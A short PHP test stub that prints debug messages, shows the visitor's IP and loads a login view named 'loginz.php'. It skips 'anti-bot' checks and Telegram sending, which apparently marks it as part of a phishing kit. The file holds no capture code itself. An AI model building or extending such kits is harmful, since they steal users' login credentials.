<?php
// Local test version - bypasses anti-bot protection
echo "Local test version - bypassing anti-bot protection<br>";

// Skip all anti-bot checks for local testing
echo "Skipping anti-bot checks...<br>";

// Test basic functionality
$ip = $_SERVER['REMOTE_ADDR'];
echo "IP: $ip<br>";

// Skip Telegram for now
echo "Skipping Telegram for testing...<br>";

// Show the login page directly
echo "Loading login page...<br>";
include './views/loginz.php';
?>
